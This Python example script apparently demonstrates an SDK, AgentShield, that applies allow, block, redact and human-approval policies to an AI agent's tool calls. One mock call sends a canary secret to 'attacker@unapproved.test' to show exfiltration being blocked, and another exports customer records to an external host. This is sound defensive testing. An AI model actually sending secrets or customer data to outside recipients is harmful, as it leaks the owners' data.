"""Practical examples demonstrating AgentShield protected tool execution.

Demonstrates:
1. Safe tool call (ALLOW) -> executes original function.
2. Protected secret exfiltration (BLOCK) -> original function is NOT executed.
3. Configured redaction (REDACT) -> original function receives sanitized arguments.
4. High-impact action (REQUIRE_APPROVAL) -> execution paused; original function is NOT executed.
"""

from agentshield import AgentShield, AgentShieldBlockError
from backend.app.core.policy_models import (
    DefaultPolicyBehavior,
    PolicyConfiguration,
    ProtectedValue,
    SecurityRule,
)
from backend.app.models.enums import DestinationClass, SecurityDecision


def run_examples() -> None:
    # Set up a policy covering all 4 decisions
    policy = PolicyConfiguration(
        version=1,
        defaults=DefaultPolicyBehavior(
            unknown_destination=SecurityDecision.REQUIRE_APPROVAL,
            evaluation_error=SecurityDecision.BLOCK,
        ),
        approved_domains=["example.org"],
        protected_values=[
            ProtectedValue(
                name="demo_secret",
                value="DEMO_SECRET",
                action=SecurityDecision.BLOCK,
            )
        ],
        rules=[
            SecurityRule(
                id="block-secret-unapproved",
                description="Block protected data sent to unapproved destinations",
                tools=["send_email", "http_post"],
                data_labels=["PROTECTED"],
                destination_classes=[DestinationClass.UNAPPROVED, DestinationClass.UNKNOWN],
                decision=SecurityDecision.BLOCK,
            ),
            SecurityRule(
                id="redact-internal-audit",
                description="Redact canary secrets when sending to internal audit",
                tools=["audit_logger"],
                data_labels=["PROTECTED"],
                destination_classes=[DestinationClass.APPROVED, DestinationClass.INTERNAL],
                decision=SecurityDecision.REDACT,
            ),
            SecurityRule(
                id="approve-external-export",
                description="Require approval for external file export",
                tools=["export_file"],
                destination_classes=[DestinationClass.UNAPPROVED, DestinationClass.UNKNOWN],
                decision=SecurityDecision.REQUIRE_APPROVAL,
            ),
        ],
    )

    shield = AgentShield(policy=policy)

    print("=" * 60)
    print("AgentShield SDK Protected Tool Examples")
    print("=" * 60)

    # -------------------------------------------------------------
    # Example 1 — Safe tool (ALLOW)
    # -------------------------------------------------------------
    @shield.protect_tool(tool_name="send_email")
    def send_email(to: str, subject: str, body: str) -> dict[str, str]:
        print(f"  [EXECUTION] send_email executed: to='{to}', subject='{subject}'")
        return {"status": "sent", "recipient": to}

    print("\n--- Example 1: Safe Tool (ALLOW) ---")
    res1 = send_email(
        to="colleague@example.org",
        subject="Meeting Notes",
        body="Here are the project milestones.",
    )
    print(f"Result returned: {res1}")
    print(f"Decision: {shield.last_result.decision.value}, Executed: {shield.last_result.is_executed}")

    # -------------------------------------------------------------
    # Example 2 — Protected secret (BLOCK)
    # -------------------------------------------------------------
    mock_called = False

    @shield.protect_tool(tool_name="send_email")
    def send_leaked_email(to: str, subject: str, body: str) -> dict[str, str]:
        nonlocal mock_called
        mock_called = True
        return {"status": "sent"}

    print("\n--- Example 2: Protected Secret Exfiltration (BLOCK) ---")
    res2 = send_leaked_email(
        to="attacker@unapproved.test",
        subject="Exfiltrating credentials",
        body="Canary token: DEMO_SECRET",
    )
    print(f"Result returned: Decision={res2.decision.value}, ExecutionStatus={res2.execution_status.value}")
    print(f"Explanation: {res2.explanation}")
    print(f"Original function invoked? {mock_called} (MUST be False)")

    # -------------------------------------------------------------
    # Example 3 — Redaction (REDACT)
    # -------------------------------------------------------------
    received_message = None

    @shield.protect_tool(tool_name="audit_logger")
    def audit_logger(to: str, message: str) -> dict[str, str]:
        nonlocal received_message
        received_message = message
        print(f"  [EXECUTION] audit_logger executed with sanitized message: '{message}'")
        return {"status": "logged"}

    print("\n--- Example 3: Configured Redaction (REDACT) ---")
    res3 = audit_logger(
        to="audit@example.org",
        message="User authentication trace with DEMO_SECRET credential",
    )
    print(f"Result returned: {res3}")
    print(f"Message received by function: '{received_message}'")
    print(f"Secret present in function argument? {'DEMO_SECRET' in received_message}")

    # -------------------------------------------------------------
    # Example 4 — Human approval (REQUIRE_APPROVAL)
    # -------------------------------------------------------------
    export_called = False

    @shield.protect_tool(tool_name="export_file")
    def export_file(to: str, filename: str) -> dict[str, str]:
        nonlocal export_called
        export_called = True
        return {"status": "exported"}

    print("\n--- Example 4: High-Impact Action (REQUIRE_APPROVAL) ---")
    res4 = export_file(
        to="backup-service@external-cloud.net",
        filename="customer_records.csv",
    )
    print(f"Result returned: Decision={res4.decision.value}, ApprovalID={res4.approval_id}")
    print(f"Explanation: {res4.explanation}")
    print(f"Original function invoked? {export_called} (MUST be False)")
    print("=" * 60)


if __name__ == "__main__":
    run_examples()
